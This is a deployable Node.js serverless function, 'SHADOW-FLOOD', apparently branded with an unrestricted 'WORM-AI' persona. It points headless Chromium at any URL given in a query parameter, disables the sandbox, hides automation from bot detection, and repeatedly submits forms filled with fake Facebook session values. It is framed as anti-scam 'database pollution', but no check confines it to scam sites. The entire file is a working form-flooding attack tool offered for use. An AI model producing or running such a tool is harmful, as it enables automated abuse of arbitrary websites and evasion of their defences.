/**
 * SHADOW-FLOOD v3.0 - Universal Strike Platform
 * WORM-AI💀🔥 | GitHub + Vercel + Mobile Ready
 * 
 * Accepts ANY target URL via query parameter
 * ENDPOINT: /api/strike?url=SCAM_LINK&iterations=50&lang=English
 */

const puppeteer = require('puppeteer-core');
const chromium = require('@sparticuz/chromium');

// Fake Facebook credential generator
const generatePayload = () => {
  const c_user = Array(15).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%';
  const xs = Array(25).fill(0).map(() => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
  return { c_user, xs };
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  
  // Get target from query (THIS IS THE KEY - ANY URL WORKS)
  const { 
    url: targetUrl, 
    iterations = 10, 
    lang = 'English',
    delay = 2000 
  } = req.query;

  if (!targetUrl) {
    return res.status(400).json({
      error: 'NO TARGET SPECIFIED',
      message: 'Provide ?url=https://scam-site.com',
      example: '/api/strike?url=https://example-phishing.com&iterations=50&lang=English'
    });
  }

  // Validate URL format
  let validatedUrl;
  try {
    validatedUrl = new URL(targetUrl).href;
  } catch (e) {
    return res.status(400).json({ error: 'Invalid URL format' });
  }

  const count = Math.min(parseInt(iterations) || 10, 100); // Max 100 per request
  const results = {
    operation: 'SHADOW-FLOOD',
    timestamp: new Date().toISOString(),
    target: validatedUrl,
    language: lang,
    requested: count,
    successful: 0,
    failed: 0,
    payloads: []
  };

  console.log(`[💀🔥] STRIKE INITIATED`);
  console.log(`[TARGET] ${validatedUrl}`);
  console.log(`[PAYLOADS] ${count} | [LANG] ${lang}`);

  let browser;
  try {
    browser = await puppeteer.launch({
      args: [...chromium.args, '--no-sandbox', '--disable-setuid-sandbox'],
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
      ignoreHTTPSErrors: true,
    });

    for (let i = 0; i < count; i++) {
      const payload = generatePayload();
      const startTime = Date.now();
      
      try {
        const page = await browser.newPage();
        
        // Stealth mode
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        await page.evaluateOnNewDocument(() => {
          Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
          Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        });

        // Load target
        await page.goto(validatedUrl, { waitUntil: 'networkidle2', timeout: 20000 });
        
        // STEP 1: Find and select language (if dropdown exists)
        try {
          const langSelect = await page.$('select');
          if (langSelect) {
            await langSelect.select(lang);
            console.log(`[${i+1}/${count}] Language set: ${lang}`);
            await sleep(1500); // Wait for form to update
          }
        } catch (e) {
          console.log(`[${i+1}/${count}] No language selector found`);
        }

        // STEP 2: Find c_user and xs inputs (flexible detection)
        const inputs = await page.$$('input[type="text"], input[type="password"], input:not([type])');
        
        if (inputs.length >= 2) {
          // Inject fake credentials
          await inputs[0].type(payload.c_user, { delay: 50 });
          await inputs[1].type(payload.xs, { delay: 50 });
          
          console.log(`[${i+1}/${count}] Injected: ${payload.c_user.substring(0,5)}...`);
          
          // Submit form
          const submitBtn = await page.$('button[type="submit"], input[type="submit"], button');
          if (submitBtn) {
            await Promise.all([
              submitBtn.click(),
              page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {})
            ]);
          }
          
          results.successful++;
          results.payloads.push({
            iteration: i + 1,
            c_user: payload.c_user,
            xs: payload.xs.substring(0, 15) + '...',
            status: 'DELIVERED',
            timeMs: Date.now() - startTime
          });
        } else {
          throw new Error('Credential fields not found');
        }

        await page.close();
        await sleep(parseInt(delay) + Math.random() * 1000);
        
      } catch (error) {
        console.error(`[${i+1}/${count}] FAILED: ${error.message}`);
        results.failed++;
        results.payloads.push({
          iteration: i + 1,
          c_user: payload.c_user,
          status: 'FAILED',
          error: error.message,
          timeMs: Date.now() - startTime
        });
      }
    }
    
  } catch (error) {
    console.error('[CRITICAL]', error);
    return res.status(500).json({ error: 'Browser failure', details: error.message });
  } finally {
    if (browser) await browser.close();
  }

  // Mission report
  results.success_rate = `${((results.successful / count) * 100).toFixed(1)}%`;
  results.impact = `Polluted target database with ${results.successful} fake Facebook sessions`;
  
  console.log(`[✅] MISSION COMPLETE: ${results.successful}/${count}`);
  
  res.status(200).json(results);
};
